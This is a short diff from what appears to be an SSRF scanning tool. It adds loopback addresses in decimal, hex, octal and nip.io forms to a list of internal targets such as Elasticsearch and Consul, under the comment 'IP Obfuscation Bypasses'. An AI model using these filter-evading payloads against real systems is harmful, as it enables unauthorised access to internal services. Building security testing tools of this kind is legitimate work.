@@ -39,6 +39,11 @@ SSRF_TARGETS = [
     "http://127.0.0.1:9200/",        # Elasticsearch
     "http://127.0.0.1:8500/",        # Consul
     "http://127.0.0.1:4040/",        # ngrok admin
+    # IP Obfuscation Bypasses
+    "http://2130706433/",            # 127.0.0.1 Decimal
+    "http://0x7f000001/",            # 127.0.0.1 Hex
+    "http://0177.0000.0000.0001/",   # 127.0.0.1 Octal
+    "http://127.0.0.1.nip.io/",      # 127.0.0.1 DNS resolution
 ]
 
 # Indicadores de SSRF bem-sucedido
